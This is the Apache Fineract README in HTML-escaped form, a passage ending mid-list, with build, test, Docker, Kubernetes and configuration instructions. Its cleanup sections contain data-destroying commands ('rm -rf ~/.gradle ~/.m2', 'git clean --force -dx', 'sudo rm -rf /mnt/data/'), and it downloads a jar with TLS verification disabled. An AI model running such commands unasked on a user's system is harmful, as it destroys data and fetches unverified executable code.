&lt;p&gt;Run the following commands:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;code&gt;./gradlew createDB -PdbName=fineract_tenants&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;./gradlew createDB -PdbName=fineract_default&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;./gradlew devRun&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h1&gt;&lt;br&gt;INSTRUCTIONS: How to build the JAR file&lt;/h1&gt; 
&lt;ol&gt; 
 &lt;li&gt;Clone the repository or download and extract the archive file to your local directory.&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;./gradlew clean bootJar&lt;/code&gt; to build a modern cloud native fully self contained JAR file which will be created at &lt;code&gt;fineract-provider/build/libs&lt;/code&gt; directory.&lt;/li&gt; 
 &lt;li&gt;As we are not allowed to include a JDBC driver in the built JAR, download a JDBC driver of your choice. For example: &lt;code&gt;wget https://dlm.mariadb.com/4174416/Connectors/java/connector-java-3.5.2/mariadb-java-client-3.5.2.jar&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Start the jar and pass the directory where you have downloaded the JDBC driver as loader.path, for example: &lt;code&gt;java -Dloader.path=. -jar fineract-provider/build/libs/fineract-provider.jar&lt;/code&gt; (does not require external Tomcat)&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;The tenants database connection details are configured &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/#instructions-to-run-using-docker-and-docker-compose"&gt;via environment variables (as with Docker container)&lt;/a&gt;, e.g. like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;export FINERACT_HIKARI_PASSWORD=verysecret
...
java -jar fineract-provider.jar
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;&lt;br&gt;SECURITY&lt;/h1&gt; 
&lt;p&gt;If you believe you have found a security vulnerability, &lt;a href="https://fineract.apache.org/#contribute"&gt;let us know privately&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;For details about security during development and deployment, see &lt;a href="https://fineract.apache.org/docs/current/#_security"&gt;https://fineract.apache.org/docs/current/#_security&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;INSTRUCTIONS: How to build a WAR file&lt;/h1&gt; 
&lt;ol&gt; 
 &lt;li&gt;Clone the repository or download and extract the archive file to your local directory.&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;./gradlew :fineract-war:clean :fineract-war:war&lt;/code&gt; to build a traditional WAR file which will be created at &lt;code&gt;fineract-war/build/libs&lt;/code&gt; directory.&lt;/li&gt; 
 &lt;li&gt;Deploy this WAR to your Tomcat v10 Servlet Container.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;We recommend using the JAR instead of the WAR file deployment, because it's much easier.&lt;/p&gt; 
&lt;p&gt;Note that with the 1.4 release the tenants database pool configuration changed from Tomcat DBCP in XML to an embedded Hikari, configured by environment variables, see above.&lt;/p&gt; 
&lt;h1&gt;INSTRUCTIONS: How to run tests&lt;/h1&gt; 
&lt;h2&gt;Unit tests&lt;/h2&gt; 
&lt;p&gt;Here's how to run the set of relatviely fast and indepedent Fineract tests:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;./gradlew test -x :twofactor-tests:test -x :oauth2-tests:test -x :integration-tests:test
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This runs nearly 1,000 tests and completes in a few minutes on decent hardware. They shouldn't need any special servers/services running.&lt;/p&gt; 
&lt;h2&gt;Integration tests&lt;/h2&gt; 
&lt;p&gt;Running tests with external dependencies yourself is a multi-step process with many moving parts. Sometimes there are arbitrary failures and the prerequisite setup can be daunting. A full local integration test run (on a developer workstation) covering every possible test using every external service and every supported relational database engine could take an entire day, and that's assuming everything is properly configured and runs as expected.&lt;/p&gt; 
&lt;p&gt;Right now we depend on GitHub to know if "the build" is passing (it's actually multiple builds). The authoritative source of truth for what commands/services/tests to run, how, and when are the files in &lt;code&gt;.github/workflows/&lt;/code&gt;. Output from runs based on those configuration files appears at &lt;a href="https://github.com/apache/fineract/actions"&gt;https://github.com/apache/fineract/actions&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Incorrect default Java-related executables may cause test failures. To fix this on Debian and Ubuntu systems, run the following:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export JAVA_HOME=/usr/lib/jvm/zulu21
sudo update-alternatives --set java $JAVA_HOME/bin/java
sudo update-alternatives --set javac $JAVA_HOME/bin/javac
sudo update-alternatives --set javadoc $JAVA_HOME/bin/javadoc
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This would correct, for example, a &lt;a href="https://en.wikipedia.org/wiki/Java_class_file#General_layout"&gt;class file verson error&lt;/a&gt;. You might see something like this if a Java 11 executable (class file format version 56) was the system default, but the integration tests were using Java 21 (class file format version 65):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;UnsupportedClassVersionError: com.example.package/ClassName has been compiled by a more recent version of the Java Runtime (class file version 65.0), this version of the Java Runtime only recognizes class file versions up to 55.0
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;These builds are run in &lt;a href="https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners"&gt;short-lived virtual machines&lt;/a&gt;, so locally reproducing the same may require additional effort, such as these extra clean-up procedures:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Might fix `error: cannot find symbol` or other intermittent failures.
# `doc` here is a placeholder for any task(s) you are trying to run.
# ğŸ’š This is generally very safe to run between builds.
./gradlew --refresh-dependencies doc

# Destroy anything untracked by git.
# âš ï¸� This may delete something important, e.g. a finely-tuned IDE configuration.
git clean --force -dx

# Destroy various caches and configs.
# âš ï¸� This may delete gibibytes of cached data, making the next build very slow.
rm -rf ~/.gradle ~/.m2 /tmp/cargo*

# Destroy any Java containers left running.
# ğŸ’š This is generally very safe to run between builds.
ps auxwww | grep [c]argo | awk '{ print $2 }' | xargs -r kill
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Integration test runs such as &lt;code&gt;./gradlew --no-daemon --console=plain test -x :twofactor-tests:test -x :oauth2-test:test :fineract-e2e-tests-runner:test -PdbType=postgresql&lt;/code&gt; in &lt;code&gt;.github/workflows/build-postgresql.yml&lt;/code&gt; often take an hour or longer to complete. If you notice the &lt;code&gt;:integration-tests:test&lt;/code&gt; task taking significantly less time, say, one minute, gradle may be skipping it. Look for something like this in the test output:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;&amp;gt; Task :integration-tests:test UP-TO-DATE ğŸ‘€
Custom actions are attached to task ':integration-tests:test'.
Build cache key for task ':integration-tests:test' is 6aeeec3f58bf9703d4c100fbaa657f5c
Skipping task ':integration-tests:test' as it is up-to-date.
Resolve mutations for :integration-tests:cargoStopLocal (Thread[Execution worker Thread 11,5,main]) started.
:integration-tests:cargoStopLocal (Thread[Execution worker Thread 11,5,main]) started.
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;(This is with the &lt;code&gt;--info&lt;/code&gt; gradle argument with eyeballs added for emphasis) The &lt;code&gt;--rerun-tasks&lt;/code&gt; gradle argument may help, or you can try destroying &lt;code&gt;~/.gradle&lt;/code&gt; and other clean-up procedures as indicated above then re-running tests. This is useful for repeated test runs (say, for timing) when gradle would otherwise assume a task is "up-to-date" and not re-run it.&lt;/p&gt; 
&lt;h2&gt;Testing within IDEs&lt;/h2&gt; 
&lt;p&gt;See the next section for testing in Eclipse.&lt;/p&gt; 
&lt;p&gt;See &lt;a href="https://fineract-academy.com"&gt;https://fineract-academy.com&lt;/a&gt; for testing in IntelliJ.&lt;/p&gt; 
&lt;h1&gt;INSTRUCTIONS: How to run and debug in Eclipse IDE&lt;/h1&gt; 
&lt;p&gt;It is possible to run Fineract in Eclipse IDE and also to debug Fineract using Eclipse's debugging facilities. To do this, you need to create the Eclipse project files and import the project into an Eclipse workspace:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Create Eclipse project files into the Fineract project by running &lt;code&gt;./gradlew cleanEclipse eclipse&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Import the fineract-provider project into your Eclipse workspace (File-&amp;gt;Import-&amp;gt;General-&amp;gt;Existing Projects into Workspace, choose root directory fineract/fineract-provider)&lt;/li&gt; 
 &lt;li&gt;Do a clean build of the project in Eclipse (Project-&amp;gt;Clean...)&lt;/li&gt; 
 &lt;li&gt;Run / debug Fineract by right clicking on org.apache.fineract.ServerApplication class and choosing Run As / Debug As -&amp;gt; Java Application. All normal Eclipse debugging features (breakpoints, watchpoints etc) should work as expected.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;If you change the project settings (dependencies etc) in Gradle, you should redo step 1 and refresh the project in Eclipse.&lt;/p&gt; 
&lt;p&gt;You can also use Eclipse Junit support to run tests in Eclipse (Run As-&amp;gt;Junit Test)&lt;/p&gt; 
&lt;p&gt;Finally, modifying source code in Eclipse automatically triggers hot code replace to a running instance, allowing you to immediately test your changes&lt;/p&gt; 
&lt;h1&gt;INSTRUCTIONS: How to run using Docker and docker-compose&lt;/h1&gt; 
&lt;p&gt;It is possible to do a 'one-touch' installation of Fineract using containers (AKA "Docker"). Fineract now packs the mifos community-app web UI in it's docker deploy. You can now run and test fineract with a GUI directly from the combined docker builds. This includes the database running in a container.&lt;/p&gt; 
&lt;p&gt;As Prerequisites, you must have &lt;code&gt;docker&lt;/code&gt; and &lt;code&gt;docker-compose&lt;/code&gt; installed on your machine; see &lt;a href="https://docs.docker.com/install/"&gt;Docker Install&lt;/a&gt; and &lt;a href="https://docs.docker.com/compose/install/"&gt;Docker Compose Install&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Alternatively, you can also use &lt;a href="https://github.com/containers/libpod"&gt;Podman&lt;/a&gt; (e.g. via &lt;code&gt;dnf install podman-docker&lt;/code&gt;), and &lt;a href="https://github.com/containers/podman-compose/"&gt;Podman Compose&lt;/a&gt; (e.g. via &lt;code&gt;pip3 install podman-compose&lt;/code&gt;) instead of Docker.&lt;/p&gt; 
&lt;p&gt;Now to run a new Fineract instance you can simply:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;code&gt;git clone https://github.com/apache/fineract.git ; cd fineract&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;for windows, use &lt;code&gt;git clone https://github.com/apache/fineract.git --config core.autocrlf=input ; cd fineract&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;./gradlew :fineract-provider:jibDockerBuild -x test&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;install the Loki log driver with &lt;code&gt;docker plugin install grafana/loki-docker-driver:latest --alias loki --grant-all-permissions&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;docker compose -f docker-compose-development.yml up -d&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;fineract (back-end) is running at &lt;a href="https://localhost:8443/fineract-provider/"&gt;https://localhost:8443/fineract-provider/&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;wait for &lt;a href="https://localhost:8443/fineract-provider/actuator/health"&gt;https://localhost:8443/fineract-provider/actuator/health&lt;/a&gt; to return &lt;code&gt;{"status":"UP"}&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;you must go to &lt;a href="https://localhost:8443"&gt;https://localhost:8443&lt;/a&gt; and remember to accept the self-signed SSL certificate of the API once in your browser, otherwise you get a message that is rather misleading from the UI.&lt;/li&gt; 
 &lt;li&gt;community-app (UI) is running at &lt;a href="http://localhost:9090/?baseApiUrl=https://localhost:8443/fineract-provider&amp;amp;tenantIdentifier=default"&gt;http://localhost:9090/?baseApiUrl=https://localhost:8443/fineract-provider&amp;amp;tenantIdentifier=default&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;login using default &lt;em&gt;username&lt;/em&gt; &lt;code&gt;mifos&lt;/code&gt; and &lt;em&gt;password&lt;/em&gt; &lt;code&gt;password&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;a href="https://hub.docker.com/r/apache/fineract"&gt;https://hub.docker.com/r/apache/fineract&lt;/a&gt; has a pre-built container image of this project, built continuously.&lt;/p&gt; 
&lt;p&gt;You must specify the MySQL tenants database JDBC URL by passing it to the &lt;code&gt;fineract&lt;/code&gt; container via environment variables; please consult the &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/docker-compose.yml"&gt;&lt;code&gt;docker-compose.yml&lt;/code&gt;&lt;/a&gt; for exact details how to specify those. &lt;em&gt;(Note that in previous versions, the &lt;code&gt;mysqlserver&lt;/code&gt; environment variable used at &lt;code&gt;docker build&lt;/code&gt; time instead of at &lt;code&gt;docker run&lt;/code&gt; time did something similar; this has changed in &lt;a href="https://issues.apache.org/jira/browse/FINERACT-773"&gt;FINERACT-773&lt;/a&gt;), and the &lt;code&gt;mysqlserver&lt;/code&gt; environment variable is now no longer supported.)&lt;/em&gt;&lt;/p&gt; 
&lt;p&gt;The logfiles and the Java Flight Recorder output are available in &lt;code&gt;PROJECT_ROOT/build/fineract/logs&lt;/code&gt;. If you use IntelliJ then you can double-click on the &lt;code&gt;.jfr&lt;/code&gt; file and open it with the IDE. You can also download Azul Mission Control from here &lt;a href="https://www.azul.com/products/components/azul-mission-control/"&gt;https://www.azul.com/products/components/azul-mission-control/&lt;/a&gt; to analyze the Java Flight Recorder file.&lt;/p&gt; 
&lt;p&gt;NOTE: If you have issues with the file permissions and Docker Compose then you might need to change the variable values for &lt;code&gt;FINERACT_USER&lt;/code&gt; and &lt;code&gt;FINERACT_GROUP&lt;/code&gt; in &lt;code&gt;PROJECT_ROOT/config/docker/env/fineract-common.env&lt;/code&gt;. You can find out what values you need to put there with the following commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;id -u ${USER}
id -u ${GROUP}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Please make sure that you are not checking in your changed values. The defaults should normally work for most people.&lt;/p&gt; 
&lt;h1&gt;INSTRUCTIONS: How to build documentation&lt;/h1&gt; 
&lt;p&gt;Run the following command:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;./gradlew doc
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Some dependencies are required (e.g. Ghostscript, Graphviz), see &lt;code&gt;.github/workflows/build-documentation.yml&lt;/code&gt; for hints.&lt;/p&gt; 
&lt;p&gt;Additionally, IDEs such as IntelliJ are useful for editing the AsciiDoc source files while providing a live rendered preview.&lt;/p&gt; 
&lt;p&gt;HTML rendered from the AsciiDoc source files is also available online at &lt;a href="https://fineract.apache.org/docs/current/"&gt;https://fineract.apache.org/docs/current/&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Connection pool configuration&lt;/h1&gt; 
&lt;p&gt;Please check &lt;code&gt;application.properties&lt;/code&gt; to see which connection pool settings can be tweaked. The associated environment variables are prefixed with &lt;code&gt;FINERACT_HIKARI_*&lt;/code&gt;. You can find more information about specific connection pool settings (Hikari) at &lt;a href="https://github.com/brettwooldridge/HikariCP#configuration-knobs-baby"&gt;https://github.com/brettwooldridge/HikariCP#configuration-knobs-baby&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;NOTE: we'll keep backwards compatibility until one of the next releases to ensure that things are working as expected. Environment variables prefixed &lt;code&gt;fineract_tenants_*&lt;/code&gt; can still be used to configure the database connection, but we strongly encourage using &lt;code&gt;FINERACT_HIKARI_*&lt;/code&gt; with more options.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;SSL CONFIGURATION&lt;/h1&gt; 
&lt;p&gt;See &lt;a href="https://fineract.apache.org/docs/current/#_https"&gt;the HTTPS related doc&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;TOMCAT CONFIGURATION&lt;/h1&gt; 
&lt;p&gt;Please refer to the &lt;code&gt;application.properties&lt;/code&gt; and the official Spring Boot documentation (&lt;a href="https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html"&gt;https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html&lt;/a&gt;) on how to do performance tuning for Tomcat. Note: you can set now the acceptable form POST size (default is 2MB) via environment variable &lt;code&gt;FINERACT_SERVER_TOMCAT_MAX_HTTP_FORM_POST_SIZE&lt;/code&gt;.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;INSTRUCTIONS: How to run on Kubernetes&lt;/h1&gt; 
&lt;h2&gt;&lt;br&gt;General Clusters&lt;/h2&gt; 
&lt;p&gt;You can also run Fineract using containers on a Kubernetes cluster. Make sure you set up and connect to your Kubernetes cluster. You can follow &lt;a href="https://cwiki.apache.org/confluence/display/FINERACT/Install+and+configure+kubectl+and+Google+Cloud+SDK+on+ubuntu+16.04"&gt;this&lt;/a&gt; guide to set up a Kubernetes cluster on GKE. Make sure to replace &lt;code&gt;apache-fineract-cn&lt;/code&gt; with &lt;code&gt;apache-fineract&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;Now e.g. from your Google Cloud shell, run the following commands:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;code&gt;git clone https://github.com/apache/fineract.git ; cd fineract/kubernetes&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;./kubectl-startup.sh&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;To shutdown and reset your Cluster, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./kubectl-shutdown.sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Using Minikube&lt;/h2&gt; 
&lt;p&gt;Alternatively, you can run fineract on a local kubernetes cluster using &lt;a href="https://minikube.sigs.k8s.io/docs/"&gt;minikube&lt;/a&gt;. As Prerequisites, you must have &lt;code&gt;minikube&lt;/code&gt; and &lt;code&gt;kubectl&lt;/code&gt; installed on your machine; see &lt;a href="https://kubernetes.io/docs/tasks/tools/install-minikube/"&gt;Minikube &amp;amp; Kubectl install&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Now to run a new Fineract instance on Minikube you can simply:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;git clone https://github.com/apache/fineract.git ; cd fineract/kubernetes&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;minikube start&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;./kubectl-startup.sh&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;code&gt;minikube service fineract-server --url --https&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Fineract is now running at the printed URL (note HTTP), which you can check e.g. using:&lt;/p&gt; &lt;p&gt;http --verify=no --timeout 240 --check-status get $(minikube service fineract-server --url --https)/fineract-provider/actuator/health&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;To check the status of your containers on your local minikube Kubernetes cluster, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;minikube dashboard
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can check Fineract logs using:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;kubectl logs deployment/fineract-server
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To shutdown and reset your cluster, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;./kubectl-shutdown.sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To shutdown and reset your cluster, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;minikube ssh

sudo rm -rf /mnt/data/
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;We have &lt;a href="https://jira.apache.org/jira/browse/FINERACT-783?jql=labels%20%3D%20kubernetes%20AND%20project%20%3D%20%22Apache%20Fineract%22%20"&gt;some open issues in JIRA with Kubernetes related enhancement ideas&lt;/a&gt; which you are welcome to contribute to.&lt;/p&gt; 
&lt;h1&gt;INSTRUCTIONS: How to download Gradle wrapper&lt;/h1&gt; 
&lt;p&gt;The file gradle/wrapper/gradle-wrapper.jar binary is checked into this projects Git source repository, but won't exist in your copy of the Fineract codebase if you downloaded a released source archive from apache.org. In that case, you need to download it using the commands below:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;wget --no-check-certificate -P gradle/wrapper https://github.com/apache/fineract/raw/develop/gradle/wrapper/gradle-wrapper.jar
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;(or)&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;curl --insecure -L https://github.com/apache/fineract/raw/develop/gradle/wrapper/gradle-wrapper.jar &amp;gt; gradle/wrapper/gradle-wrapper.jar
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;INSTRUCTIONS: How to run Apache RAT (Release Audit Tool)&lt;/h1&gt; 
&lt;ol&gt; 
 &lt;li&gt;Extract the archive file to your local directory.&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;./gradlew rat&lt;/code&gt;. A report will be generated under build/reports/rat/rat-report.txt&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h1&gt;INSTRUCTIONS: How to enable External Message Broker (ActiveMQ or Apache Kafka)&lt;/h1&gt; 
&lt;p&gt;There are two use-cases where external message broker is needed:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;External Business Events / Reliable Event Framework&lt;/li&gt; 
 &lt;li&gt;Executing Partitioned Spring Batch Jobs&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;External Events are business events, e.g.: &lt;code&gt;ClientCreated&lt;/code&gt;, which might be important for third party systems. Apache Fineract supports ActiveMQ (or other JMS compliant brokers) and Apache Kafka endpoints for sending out Business Events. By default, they are not emitted.&lt;/p&gt; 
&lt;p&gt;In case of a large deployment with millions of accounts, the Close of Business Day Spring Batch job may run several hours. In order to speed up this task, remote partitioning of the job is supported. The Manager node partitions (breaks up) the COB job into smaller pieces (sub tasks) which then can be executed on multiple Worker nodes in parallel. The worker nodes are notified either by ActiveMQ or Kafka regarding their new sub tasks.&lt;/p&gt; 
&lt;h3&gt;Active MQ&lt;/h3&gt; 
&lt;p&gt;JMS based messaging is disabled by default. In &lt;code&gt;docker-compose-postgresql-activemq.yml&lt;/code&gt; an example is shown where ActiveMQ is enabled. In that configuration one Spring Batch Manager instance and two Spring Batch Worker instances are created. Spring based events should be disabled and jms based event handling should be enabled. Furthermore, proper broker JMS URL should be configured.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;      FINERACT_REMOTE_JOB_MESSAGE_HANDLER_JMS_ENABLED=true
      FINERACT_REMOTE_JOB_MESSAGE_HANDLER_SPRING_EVENTS_ENABLED=false
      FINERACT_REMOTE_JOB_MESSAGE_HANDLER_JMS_BROKER_URL=tcp://activemq:61616
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For additional ActiveMQ related configuration please take a look to the &lt;code&gt;application.properties&lt;/code&gt; where the supported configuration parameters are listed with their default values.&lt;/p&gt; 
&lt;h3&gt;Kafka&lt;/h3&gt; 
&lt;p&gt;Kafka support also disabled by default. In &lt;code&gt;docker-compose-postgresql-kafka.yml&lt;/code&gt; an example is shown where self-hosted Kafka is enabled for both External Events and Spring Batch Remote Job execution.&lt;/p&gt; 
&lt;p&gt;During the development Fineract was tested with PLAINTEXT Kafka brokers without authentication and with AWS MSK using IAM authentication. The extra &lt;a href="https://github.com/aws/aws-msk-iam-auth/releases"&gt;jar file&lt;/a&gt; required for IAM authentication is already added to the classpath. An example MSK setup can be found in &lt;code&gt;docker-compose-postgresql-kafka-msk.yml&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The full list of supported Kafka related properties are documented here: &lt;a href="https://fineract.apache.org/docs/current/"&gt;https://fineract.apache.org/docs/current/&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;Checkstyle and Spotless&lt;/h1&gt; 
&lt;p&gt;This project enforces its code conventions using &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/config/checkstyle/checkstyle.xml"&gt;checkstyle.xml&lt;/a&gt; through Checkstyle and &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/config/fineract-formatting-preferences.xml"&gt;fineract-formatting-preferences.xml&lt;/a&gt; through Spotless. They are configured to run automatically during the normal Gradle build, and fail if there are any violations detected. You can run the following command to automatically fix spotless violations:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;`./gradlew spotlessApply`
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Since some checks are present in both Checkstyle and Spotless, the same command can help you fix some of the Checkstyle violations (but not all, other Checkstyle violations need to fixed manually).&lt;/p&gt; 
&lt;p&gt;You can also check for Spotless violations (only; but normally don't have to, because the regular build full already includes this anyway):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;`./gradlew spotlessCheck`
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;We recommend that you configure your favourite Java IDE to match those conventions. For Eclipse, you can go to Window &amp;gt; Java &amp;gt; Code Style and import our &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/config/fineractdev-formatter.xml"&gt;config/fineractdev-formatter.xml&lt;/a&gt; under formatter section and &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/config/fineractdev-cleanup.xml"&gt;config/fineractdev-cleanup.xml&lt;/a&gt; under Clean up section. The same fineractdev-formatter.xml configuration file (that can be used in Eclipse IDE) is also used by Spotless to both check for violations and autoformat code on the CLI. You could also use Checkstyle directly in your IDE (but you don't neccesarily have to, it may just be more convenient for you). For Eclipse, use &lt;a href="https://checkstyle.org/eclipse-cs/"&gt;https://checkstyle.org/eclipse-cs/&lt;/a&gt; and load our checkstyle.xml into it, for IntelliJ you can use &lt;a href="https://plugins.jetbrains.com/plugin/1065-checkstyle-idea"&gt;CheckStyle-IDEA&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Code Coverage Reports&lt;/h1&gt; 
&lt;p&gt;The project uses Jacoco to measure unit tests code coverage, to generate a report run the following command:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;`./gradlew clean build jacocoTestReport`
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Generated reports can be found in build/code-coverage directory.&lt;/p&gt; 
&lt;h1&gt;Versions&lt;/h1&gt; 
&lt;p&gt;The latest stable release can be viewed on the develop branch: &lt;a href="https://github.com/apache/fineract/tree/develop" title="Latest Release"&gt;Latest Release on Develop&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The progress of this project can be viewed here: &lt;a href="https://github.com/apache/fineract/raw/develop/CHANGELOG.md" title="Latest release change log"&gt;View change log&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;License&lt;/h1&gt; 
&lt;p&gt;This project is licensed under Apache License Version 2.0. See &lt;a href="https://github.com/apache/fineract/raw/develop/APACHE_LICENSETEXT.md"&gt;https://github.com/apache/fineract/blob/develop/APACHE_LICENSETEXT.md&lt;/a&gt; for reference.&lt;/p&gt; 
&lt;p&gt;The Connector/J JDBC Driver client library from MariaDB.org, which is licensed under the LGPL, is used in development when running integration tests that use the Liquibase library. That JDBC driver is however not included in and distributed with the Fineract product and is not required to use the product. If you are developer and object to using the LGPL licensed Connector/J JDBC driver, simply do not run the integration tests that use the Liquibase library and/or use another JDBC driver. As discussed in &lt;a href="https://issues.apache.org/jira/browse/LEGAL-462"&gt;LEGAL-462&lt;/a&gt;, this project therefore complies with the &lt;a href="https://www.apache.org/legal/resolved.html"&gt;Apache Software Foundation third-party license policy&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;&lt;br&gt;APACHE FINERACT PLATFORM API&lt;/h1&gt; 
&lt;p&gt;The API for Fineract is documented in &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/fineract-provider/src/main/resources/static/legacy-docs/apiLive.htm"&gt;apiLive.htm&lt;/a&gt;, and the &lt;a href="https://fineract.apache.org/docs/legacy/" title="API Documentation"&gt;apiLive.htm can be viewed on fineract.apache.org&lt;/a&gt;. If you have your own Fineract instance running, you can find this documentation under &lt;a href="https://localhost:8443/fineract-provider/legacy-docs/apiLive.htm"&gt;/fineract-provider/legacy-docs/apiLive.htm&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The Swagger documentation (work in progress; see &lt;a href="https://issues.apache.org/jira/browse/FINERACT-733"&gt;FINERACT-733&lt;/a&gt;) can be accessed under &lt;a href="https://localhost:8443/fineract-provider/swagger-ui/index.html"&gt;/fineract-provider/swagger-ui/index.html&lt;/a&gt; and &lt;a href="https://sandbox.mifos.community/fineract-provider/swagger-ui/index.html"&gt;live Swagger UI here on Fineract.dev&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Apache Fineract supports client code generation using &lt;a href="https://github.com/swagger-api/swagger-codegen"&gt;Swagger Codegen&lt;/a&gt; based on the &lt;a href="https://swagger.io/specification/"&gt;OpenAPI Specification&lt;/a&gt;. For more instructions on how to generate the client code, check &lt;a href="https://raw.githubusercontent.com/apache/fineract/develop/fineract-doc/src/docs/en/chapters/sdk/client.adoc"&gt;fineract-doc/src/docs/en/chapters/sdk/client.adoc&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;API CLIENTS (Web UIs, Mobile, etc.)&lt;/h1&gt; 
&lt;ul&gt; 
